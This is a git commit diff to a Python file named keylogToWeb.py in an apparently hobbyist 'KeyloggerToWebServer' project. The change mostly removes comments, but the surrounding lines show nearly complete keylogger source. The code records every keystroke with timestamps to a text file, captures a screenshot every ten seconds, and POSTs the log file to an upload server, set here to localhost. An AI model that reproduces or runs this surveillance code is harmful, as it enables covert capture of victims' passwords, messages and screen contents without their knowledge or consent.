fb9dbb7cf2dc0c6d2f1b9537f3acd20ad9b53054
LinceAzul <49167361+LinceAzul@users.noreply.github.com>
2023-08-19 21:14:34 +0200

    Update keylogToWeb.py

--- KeyloggerToWebServer/keylogToWeb.py
+++ KeyloggerToWebServer/keylogToWeb.py
@@ -5,37 +5,30 @@ import pyautogui
 import socket
 import requests
 
-# Define the callback function to handle key press events
 def on_press_function(key):
-    # Write the pressed key to the file without single quotes
     with open("keylog2.txt", "a") as f:
         # Check if a special key is pressed, such as Enter, space, backspace (for deletion), etc
         if key == Key.enter:
-            # Write a newline character to separate phrases
             f.write(f" - {datetime.datetime.now()}\n")
             f.write("\n")
         elif key == Key.space:
-            # Write a space character to separate words
             f.write(" ")
         elif key == Key.backspace:
             f.write("[BACKSPACE]")
         else:
             f.write(str(key).strip("'"))
 
+# Still have to check this function
 def capture_screenshot():
-    # Generate a unique filename using the current timestamp
     timestamp = time.strftime("%Y%m%d_%H%M%S")
     filename = f"screenshot_{timestamp}.png"
 
-    # Capture the screenshot and save it
     screenshot = pyautogui.screenshot()
     screenshot.save(filename)
 
 def send_file():
-    # Specify the URL of the server
     server_url = "http://localhost:80/upload"
 
-    # Read the content of the file
     with open("keylog2.txt", "rb") as file:
         file_content = file.read()
 
@@ -47,7 +40,6 @@ def send_file():
         # Send the POST request to the server
         response = requests.post(server_url, headers=headers, data=data)
         
-        # Check the response status
         if response.status_code == 200:
             print("File sent successfully.")
         else:
@@ -55,7 +47,6 @@ def send_file():
     except requests.exceptions.ConnectionError:
         print("Connection to the server failed. Make sure the server is running.")
 
-# Create the listener object and attach the callback function
 with Listener(on_press=on_press_function) as listener:
     try:
         # Start the listener to begin capturing keyboard events
@@ -64,7 +55,6 @@ with Listener(on_press=on_press_function) as listener:
             capture_screenshot()
             time.sleep(10)
     except KeyboardInterrupt:
-        # Handle CTRL+C to terminate the program gracefully
         print("\nProgram terminated by user.")
         with open("keylog2.txt", "a") as f:
             f.write("\n")
